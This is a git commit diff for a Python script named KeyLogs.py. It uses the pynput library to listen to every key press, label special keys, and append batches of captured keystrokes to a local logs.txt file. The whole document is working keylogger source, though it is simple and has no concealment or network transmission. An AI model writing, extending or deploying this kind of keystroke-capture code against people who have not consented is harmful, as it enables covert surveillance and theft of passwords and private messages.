5d62e58f0cac555dcbdc5aa23a54f0b6fdd58cb9
Bradley Powell <bradley.powell18@gmail.com>
2022-04-07 22:50:08 -0500

    Updated Script

--- Python/KeyLogs.py
+++ Python/KeyLogs.py
@@ -1,11 +1,19 @@
+from time import time
 from pynput.keyboard import Listener
+from datetime import datetime
+
+count = 0
+keys = []
 
 
 # Define a keystroke 
 def keystroke(key):
+    global keys, count
     key = str(key).replace("'", "")
 
     # Create rules for special characters (keys with Powers)
+    # We could create a dictionary here
+    #specialChar = {'Key.space':'[SPACE]', ...}
     if key == 'Key.space':
         key = '[SPACE]'
     
@@ -23,7 +31,20 @@ def keystroke(key):
     
     if key == "Key.caps_lock":
         key = "[CAPS LOCK]"
-    print(key)
+
+    print (key)
+    keys.append(key)
+    count += 1
+
+    if count > 10:
+        write_file(keys)
+        count = 0
+        keys = []
+
+def write_file(logs):
+    with open("logs.txt", "a") as file:
+        for key in logs:
+            file.write(str(key))
 
 with Listener(on_press=keystroke) as listener:
     listener.join()
